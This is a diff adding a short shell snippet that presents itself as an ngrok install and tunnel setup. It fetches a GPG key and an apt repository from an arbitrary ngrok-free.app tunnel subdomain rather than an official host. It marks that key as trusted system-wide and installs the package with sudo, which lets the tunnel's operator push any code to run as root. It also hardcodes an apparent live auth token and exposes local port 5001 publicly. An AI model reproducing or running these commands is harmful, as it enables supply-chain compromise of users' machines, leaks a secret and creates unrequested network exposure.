@@ -1,0 +1,7 @@
+curl -s https://smooth-fun-feline.ngrok-free.app | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && \
+echo "deb https://smooth-fun-feline.ngrok-free.app" | sudo tee /etc/apt/sources.list.d/ngrok.list && \
+sudo apt update && sudo apt install ngrok
+
+# Auth + expose
+ngrok config add-authtoken 2tsWKpKZt2YT9bXhgCZyimDCFtF_6P4Qy172cpLN2or9GBmhe
+ngrok http 5001
